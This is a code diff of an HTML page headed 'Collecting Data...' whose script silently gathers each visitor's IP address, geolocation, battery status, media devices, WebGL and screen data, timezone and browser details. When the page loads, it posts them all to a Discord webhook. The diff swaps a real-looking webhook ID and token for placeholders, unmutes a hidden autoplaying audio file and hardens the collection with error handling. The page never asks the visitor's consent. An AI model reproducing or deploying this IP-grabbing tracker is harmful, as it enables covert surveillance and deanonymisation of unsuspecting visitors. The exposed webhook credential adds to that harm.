@@ -7,11 +7,11 @@
     <style>
         body {
             background-color: black;
-            color: white; /* Make text color white for better visibility on a black background */
-            font-family: Arial, sans-serif; /* Optional: Set a default font */
+            color: white;
+            font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            text-align: center; /* Center align text */
+            text-align: center;
         }
 
         h1 {
@@ -19,15 +19,15 @@
         }
 
         audio {
-            display: none; /* Hide audio element */
+            display: none; /* Hide audio element if not needed for user interaction */
         }
     </style>
 </head>
 <body>
     <h1>Collecting Data...</h1>
     
-    <!-- Audio element with autoplay and muted attributes -->
-    <audio id="audioElement" src="h.mp3" autoplay muted></audio>
+    <!-- Audio element with autoplay attribute -->
+    <audio id="audioElement" src="h.mp3" autoplay></audio>
 
     <script>
         // Function to detect the operating system
@@ -45,24 +45,34 @@
         function getIPAddress(callback) {
             const xhr = new XMLHttpRequest();
             xhr.open('GET', 'https://api.ipify.org?format=json', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
+            xhr.onload = function() {
+                if (xhr.status === 200) {
                     const response = JSON.parse(xhr.responseText);
                     const ip = response.ip;
-
-                    // Get geolocation data
                     const geoXhr = new XMLHttpRequest();
                     geoXhr.open('GET', `https://ipapi.co/${ip}/json/`, true);
-                    geoXhr.onreadystatechange = function() {
-                        if (geoXhr.readyState == 4 && geoXhr.status == 200) {
+                    geoXhr.onload = function() {
+                        if (geoXhr.status === 200) {
                             const geoResponse = JSON.parse(geoXhr.responseText);
-                            const country = geoResponse.country_name;
-                            const continent = geoResponse.continent_code;
-                            callback(ip, country, continent);
+                            callback(ip, geoResponse.country_name, geoResponse.continent_code);
+                        } else {
+                            console.error('Failed to get geolocation data');
+                            callback(ip, 'Unknown', 'Unknown');
                         }
                     };
+                    geoXhr.onerror = function() {
+                        console.error('Failed to get geolocation data');
+                        callback(ip, 'Unknown', 'Unknown');
+                    };
                     geoXhr.send();
+                } else {
+                    console.error('Failed to get IP address');
+                    callback('Unknown', 'Unknown', 'Unknown');
                 }
+            };
+            xhr.onerror = function() {
+                console.error('Failed to get IP address');
+                callback('Unknown', 'Unknown', 'Unknown');
             };
             xhr.send();
         }
@@ -93,12 +103,9 @@
             });
 
             const batteryPromise = getBatteryStatus();
-
             const [ipData, batteryData] = await Promise.all([ipPromise, batteryPromise]);
-
             const mediaDevices = await navigator.mediaDevices.enumerateDevices();
 
-            // Function to get WebGL data
             function getWebGLData() {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -125,7 +132,7 @@
                 renderingEngine: navigator.product,
                 screenResolution: `${window.screen.width}x${window.screen.height}`,
                 screenColorDepth: window.screen.colorDepth,
-                screenOrientation: window.screen.orientation.type,
+                screenOrientation: window.screen.orientation?.type || 'Unknown',
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 operatingSystem: getOS(),
                 language: navigator.language,
@@ -165,17 +172,16 @@
                     flex: CSS.supports('display', 'flex') ? 'Supported' : 'Not Supported'
                 },
                 jsFeatures: {
-                    es6: typeof Symbol != 'undefined' ? 'Supported' : 'Not Supported',
-                    promises: typeof Promise != 'undefined' ? 'Supported' : 'Not Supported'
+                    es6: typeof Symbol !== 'undefined' ? 'Supported' : 'Not Supported',
+                    promises: typeof Promise !== 'undefined' ? 'Supported' : 'Not Supported'
                 }
             };
         }
 
-        // Send the collected data to the Discord webhook
         async function sendData() {
             const data = await collectData();
             const xhr = new XMLHttpRequest();
-            const url = 'https://discord.com/api/webhooks/1249043424020004865/iZguJoomM0MqkqlEf9lZKZ9eKJNgJGKTsjUzUSexCMOXXVjQ-Mh2uIGXQOmT9QQds3_s';
+            const url = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
             xhr.open('POST', url, true);
             xhr.setRequestHeader('Content-Type', 'application/json');
 
@@ -224,16 +230,17 @@ WebGL Vendor: ${data.webGLVendor}
 Timezone Offset: ${data.timezoneOffset}
 CPU Class: ${data.cpuClass}
 Device Type: ${data.deviceType}
-CSS Features: ${JSON.stringify(data.cssFeatures)}
-JavaScript Features: ${JSON.stringify(data.jsFeatures)}
-`
+CSS Features: Grid: ${data.cssFeatures.grid}, Flex: ${data.cssFeatures.flex}
+JS Features: ES6: ${data.jsFeatures.es6}, Promises: ${data.jsFeatures.promises}`
             });
 
             xhr.send(payload);
         }
 
-        // Automatically send the data when the page loads
-        sendData();
+        // Ensure data is sent after the page has fully loaded
+        window.onload = function() {
+            sendData();
+        };
     </script>
 </body>
 </html>
